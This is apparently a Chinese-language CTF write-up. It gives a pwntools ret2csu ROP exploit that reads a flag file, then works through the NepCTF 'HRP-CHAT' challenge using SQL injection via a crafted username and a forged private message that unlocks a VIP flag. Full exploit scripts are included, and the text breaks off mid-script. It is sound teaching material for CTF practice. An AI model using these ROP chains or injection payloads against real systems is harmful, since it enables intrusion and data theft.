<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./pwn1&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(challenge)</span><br><span class="line">libc = ELF(<span class="string">&#x27;libc-2.27.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;119.13.105.35&#x27;</span>,<span class="string">&#x27;10111&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *0x4007AE\n&quot;</span>)</span><br><span class="line">    <span class="comment">#gdb.attach(p,&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;)</span></span><br><span class="line">    pause()</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line">csu_front_addr=<span class="number">0x4007F0</span></span><br><span class="line">csu_end_addr=<span class="number">0x40080A</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">csu</span>(<span class="params">rbx, rbp, r12, r13, r14, r15, last</span>):</span></span><br><span class="line">    <span class="comment"># pop rbx,rbp,r12,r13,r14,r15</span></span><br><span class="line">    <span class="comment"># rbx should be 0,</span></span><br><span class="line">    <span class="comment"># rbp should be 1,enable not to jump</span></span><br><span class="line">    <span class="comment"># r12 should be the function we want to call(只能是got表地址)</span></span><br><span class="line">    <span class="comment"># rdx=r15</span></span><br><span class="line">    <span class="comment"># rsi=r14</span></span><br><span class="line">    <span class="comment"># rdi=r13</span></span><br><span class="line">    <span class="comment"># csu(0, 1, fun_got, rdx, rsi, rdi, last)</span></span><br><span class="line">    payload = <span class="string">&quot;&quot;</span></span><br><span class="line">    payload += p64(csu_end_addr) </span><br><span class="line">    payload += p64(rbx)+p64(rbp)+p64(r12)+p64(r13)+p64(r14)+p64(r15)</span><br><span class="line">    payload += p64(csu_front_addr)</span><br><span class="line">    payload += <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x38</span>	</span><br><span class="line">    payload += p64(last)	</span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line">read_sys = <span class="number">0</span></span><br><span class="line">write_sys = <span class="number">1</span></span><br><span class="line">open_sys = <span class="number">2</span></span><br><span class="line">sigreturn = <span class="number">15</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x601050</span> + <span class="number">0x200</span></span><br><span class="line">main_addr = <span class="number">0x40075B</span></span><br><span class="line">syscall_got = <span class="number">0x600fe8</span></span><br><span class="line">leave_ret = <span class="number">0x4007AD</span></span><br><span class="line">ret = <span class="number">0x4007AE</span></span><br><span class="line">pop_rbp_ret = <span class="number">0x0000000000400628</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x30</span> + p64(bss_addr) + csu(<span class="number">0</span>, <span class="number">1</span>, syscall_got, read_sys, <span class="number">0</span>, bss_addr, pop_rbp_ret) + p64(bss_addr) + p64(leave_ret) + p64(bss_addr+<span class="number">8</span>)</span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">0.3</span>)</span><br><span class="line">payload =  <span class="string">&quot;./flag&quot;</span>.ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>)</span><br><span class="line">payload += csu(<span class="number">0</span>, <span class="number">1</span>, syscall_got, open_sys, bss_addr, <span class="number">0</span>, ret) </span><br><span class="line">payload += csu(<span class="number">0</span>, <span class="number">1</span>, syscall_got, read_sys, <span class="number">3</span>, bss_addr, ret)</span><br><span class="line">payload += csu(<span class="number">0</span>, <span class="number">1</span>, syscall_got, write_sys, <span class="number">1</span>, bss_addr, ret) </span><br><span class="line">sl(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="HRP-CHAT"><a href="#HRP-CHAT" class="headerlink" title="HRP-CHAT"></a>HRP-CHAT</h2><p>题目的 docker 启动脚本如下：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">echo $GZCTF_FLAG&gt;/home/ctf/Nep_CTF_FLAG_ONE</span><br><span class="line">nohup /home/ctf/serve &gt;result 2&gt;&amp;1 &amp;</span><br><span class="line">sleep 1</span><br><span class="line">/home/ctf/safebox /home/ctf/client</span><br></pre></td></tr></table></figure>
<ul>
<li>执行 <code>/home/ctf</code> 目录下的 serve 文件，并重定向输入到 result 文件（将标准错误 2 重定向到标准输出 &amp;1，标准输出 &amp;1 再被重定向输入到 result 文件中）</li>
<li>本题目有4个 flag 并且提供源码</li>
<li>PS：第一条命令与动态 flag 有关，需要去掉</li>
</ul>
<p>题目开始前先修改 <code>serve.c</code>，然后执行 <code>make.sh</code> 并重新编译：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">socklen_t</span> serverLen = <span class="keyword">sizeof</span>(struct sockaddr_in);</span><br><span class="line">serverSock.sin_addr.s_addr = inet_addr(IP);<span class="comment">//htonl(INADDR_ANY);</span></span><br><span class="line">serverSock.sin_port = htons(PORT);</span><br><span class="line">serverSock.sin_family = AF_INET;</span><br></pre></td></tr></table></figure>
<p>修改 <code>docker-compose.yml</code> 并搭建 docker 环境：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">version: &quot;2&quot;</span><br><span class="line">services:</span><br><span class="line">  chat:</span><br><span class="line">    build: .</span><br><span class="line">    restart: unless-stopped</span><br><span class="line">    ports:</span><br><span class="line">    - &quot;2222:8888&quot;</span><br></pre></td></tr></table></figure>
<p><strong>程序分析</strong></p>
<p>输入 help 即可查看程序的功能：</p>
<figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># ./<span class="built_in">start</span>.sh</span><br><span class="line">为缓解服务器压力客户端将以安全模式运行中</span><br><span class="line">欢迎来到NepCTF CardFight，在这里你可以进行大厅聊天以及卡牌对战，当你胜利后会获取到金币码，金币足够后可以进行商店物品兑换(flag暂未上架)</span><br><span class="line">你可以输入<span class="built_in">help</span>来获取帮助</span><br><span class="line"><span class="built_in">help</span></span><br><span class="line">输入Login进行登录和注册,数据存储在sqlite中请不要担心丢失，输入back返回上级菜单</span><br><span class="line">输入Chart进入大厅聊天室(服务器不支持空格)，输入back返回菜单选择</span><br><span class="line">输入<span class="built_in">Start</span>可以进行卡牌对战，输入back返回菜单选择</span><br><span class="line">输入Shop进入商店，输入back返回菜单选择</span><br><span class="line">输入Message获取个人数据，输入back返回上级菜单</span><br><span class="line">输入Secret进入私聊模式，输入back返回上级菜单</span><br><span class="line">输入RollCard进行抽卡，输入back返回上级菜单</span><br><span class="line">输入Bot获取远程AI协助,输入back返回上级菜单</span><br><span class="line">sqlite只存储用户名密码</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路 - flag1</strong></p>
<p>第一个 flag 位于 Shop 模块中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> sql1[<span class="number">0x100</span>];</span><br><span class="line"><span class="built_in">sprintf</span>(sql1,<span class="string">&quot;select * from user where Username=&#x27;%s&#x27; and Statement =&#x27;root&#x27;&quot;</span>,pNode-&gt;username);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n\n%s\n&quot;</span>,sql1);</span><br><span class="line"><span class="keyword">char</span> **tb;</span><br><span class="line"><span class="keyword">int</span> rows = <span class="number">0</span>;  </span><br><span class="line"><span class="keyword">int</span> cols = <span class="number">0</span>;</span><br><span class="line">rc = sqlite3_get_table(db, sql1, &amp;tb, &amp;rows, &amp;cols, <span class="literal">NULL</span>);</span><br><span class="line"><span class="keyword">if</span>(rows&gt;<span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">//exp 1&#x27;--</span></span><br><span class="line">    <span class="keyword">char</span> *flag;</span><br><span class="line">    FILE *file = fopen(<span class="string">&quot;/home/ctf/Nep_CTF_FLAG_ONE&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Could not open flag file.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fseek(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="keyword">long</span> fsize = ftell(file);</span><br><span class="line">    fseek(file, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">    flag = <span class="built_in">malloc</span>(fsize + <span class="number">1</span>);</span><br><span class="line">    fread(flag, fsize, <span class="number">1</span>, file);</span><br><span class="line">    fclose(file);</span><br><span class="line">    flag[fsize] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">strcpy</span>(msgs.message,flag);</span><br><span class="line">    send(pNode-&gt;fd, &amp;msgs, <span class="keyword">sizeof</span>(msgs), <span class="number">0</span>);</span><br><span class="line">    pthread_mutex_unlock(&amp;phead.lock);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(msgs.message,<span class="string">&quot;flag仅供root用户&quot;</span>);</span><br><span class="line">    send(pNode-&gt;fd, &amp;msgs, <span class="keyword">sizeof</span>(msgs), <span class="number">0</span>);</span><br><span class="line">    pthread_mutex_unlock(&amp;phead.lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>需要满足 <code>rows&gt;0</code> 这个条件，其值通过 <code>sqlite3_get_table</code> 函数从数据库中获取</li>
</ul>
<p>发现 sprintf 后并没有对 sql 语句进行限制，这里可能是打 sql 注入，最简单的想法就是在用户名末尾添加 <code>&#39;</code> 截断，并添加注释符号 <code>--</code>，从而绕过 <code>Statement =&#39;root&#39;</code></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> Username<span class="operator">=</span><span class="string">&#x27;yhw&#x27;</span><span class="comment">--123456&#x27; and Statement =&#x27;root&#x27;</span></span><br></pre></td></tr></table></figure>
<p>完整 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">64</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span class="number">32</span>:</span><br><span class="line">    context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#elf = ELF(challenge)</span></span><br><span class="line"><span class="comment">#libc = ELF(&#x27;libc-2.31.so&#x27;)</span></span><br><span class="line"></span><br><span class="line">rl = <span class="keyword">lambda</span>    a=<span class="literal">False</span>        : p.recvline(a)</span><br><span class="line">ru = <span class="keyword">lambda</span> a,b=<span class="literal">True</span>    : p.recvuntil(a,b)</span><br><span class="line">rn = <span class="keyword">lambda</span> x            : p.recvn(x)</span><br><span class="line">sn = <span class="keyword">lambda</span> x            : p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x            : p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> a,b            : p.sendafter(a,b)</span><br><span class="line">sla = <span class="keyword">lambda</span> a,b        : p.sendlineafter(a,b)</span><br><span class="line">irt = <span class="keyword">lambda</span>            : p.interactive()</span><br><span class="line">dbg = <span class="keyword">lambda</span> text=<span class="literal">None</span>  : gdb.attach(p, text)</span><br><span class="line"><span class="comment"># lg = lambda s,addr        : log.info(&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27; % (s,addr))</span></span><br><span class="line">lg = <span class="keyword">lambda</span> s            : log.info(<span class="string">&#x27;33[1;31;40m %s --&gt; 0x%x 33[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">uu32 = <span class="keyword">lambda</span> data        : u32(data.ljust(<span class="number">4</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line">uu64 = <span class="keyword">lambda</span> data        : u64(data.ljust(<span class="number">8</span>, <span class="string">b&#x27;x00&#x27;</span>))</span><br><span class="line"></span><br><span class="line">b = <span class="string">&quot;set debug-file-directory ./.debug/\n&quot;</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(challenge)</span><br><span class="line">    <span class="comment">#p = gdb.debug(challenge, b)</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;127.0.0.1&#x27;</span>,<span class="string">&#x27;2222&#x27;</span>)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span>():</span></span><br><span class="line">    <span class="comment">#gdb.attach(p)</span></span><br><span class="line">    gdb.attach(p,<span class="string">&quot;b *$rebase(0x1409)\nb *$rebase(0x137A)\n&quot;</span>)</span><br><span class="line">    <span class="comment">#pause()</span></span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cmd</span>(<span class="params">op</span>):</span></span><br><span class="line">    sla(<span class="string">&quot;&gt;&quot;</span>,<span class="built_in">str</span>(op))</span><br><span class="line"></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">sl(<span class="string">&quot;Login&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;(均为6个字符)&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;yhw&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;你已退出登录注册界面&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;Login&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;(均为6个字符)&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;yhw&#x27;--&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;123456&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;你已退出登录注册界面&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;Shop&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;商品信息:&quot;</span>)</span><br><span class="line">sl(<span class="string">&quot;999&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><strong>入侵思路 - flag2</strong></p>
<p>第二个 flag 在 VIP 模块中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="built_in">strcmp</span>(msg.message,<span class="string">&quot;RemoteVIPApplicationCertificationHasPassed&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s:&quot;</span>,<span class="string">&quot;你已成功申请为VIP用户,请保管好您的VIP码(此码仅往后不会再出现,请妥善保存)&quot;</span>);</span><br><span class="line">    <span class="keyword">char</span> *vip;</span><br><span class="line">    FILE *file = fopen(<span class="string">&quot;/home/ctf/Nep_CTF_FLAG_TWO&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Could not open flag file.\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    fseek(file, <span class="number">0</span>, SEEK_END);</span><br><span class="line">    <span class="keyword">long</span> fsize = ftell(file);</span><br><span class="line">    fseek(file, <span class="number">0</span>, SEEK_SET);</span><br><span class="line"></span><br><span class="line">    vip = <span class="built_in">malloc</span>(fsize + <span class="number">1</span>);</span><br><span class="line">    fread(vip, fsize, <span class="number">1</span>, file);</span><br><span class="line">    fclose(file);</span><br><span class="line">    vip[fsize] = <span class="string">&#x27;\0&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>,vip);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Bot say:%s\n&quot;</span>,msg.message);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>想要获取 VIP 必须让服务器返回的数据为 <code>RemoteVIPApplicationCertificationHasPassed</code></li>
<li>在服务端找到对应的模块，发现服务端只能返回固定字符串</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(info[<span class="number">1</span>],<span class="string">&quot;BotRemoteHelp&quot;</span>)&amp;&amp;<span class="built_in">strcmp</span>(info[<span class="number">3</span>],<span class="string">&quot;back&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(msgs.message,<span class="string">&quot;&#x27;远程AI协助服务正在开发中!&#x27;&quot;</span>);</span><br><span class="line">    send(pNode-&gt;fd, &amp;msgs, <span class="keyword">sizeof</span>(msgs), <span class="number">0</span>);</span><br><span class="line">    pthread_mutex_unlock(&amp;phead.lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我的第一反应是伪造客户端向服务端发送伪造数据包，但该题目是直接与客户端进行交互的，没有伪造的机会，不过程序似乎提供了伪造的功能：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(!<span class="built_in">strcmp</span>(info[<span class="number">1</span>],<span class="string">&quot;Secret&quot;</span>))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(msgs.message,info[<span class="number">3</span>]);</span><br><span class="line">    <span class="keyword">int</span> uid=atoi(info[<span class="number">4</span>]);</span><br><span class="line">    <span class="keyword">if</span>(uid&gt;=<span class="number">5</span>&amp;&amp;uid&lt;<span class="number">1000</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        send(uid, &amp;msgs, <span class="keyword">sizeof</span>(msgs), <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    pthread_mutex_unlock(&amp;phead.lock);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>该服务器有“聊天室”这个功能，通过这个功能可以使服务端发送任何数据到任意一个客户端</li>
<li>可以先 nc 启动一个客户端执行 Bot 命令，然后再用另一个客户端的 Secret 功能向第一个客户端发送指定数据包</li>
<li>而在 Chart 功能中可以查看目标客户端的 UID</li>
</ul>
<p>通过以下两个 exp 的配合，就可以获取 flag：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">arch = <span class="number">64</span></span><br><span class="line">challenge = <span class="string">&#x27;./&#x27;</span></span><br><span class="line"></span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="keyword">if</span> arch==<span 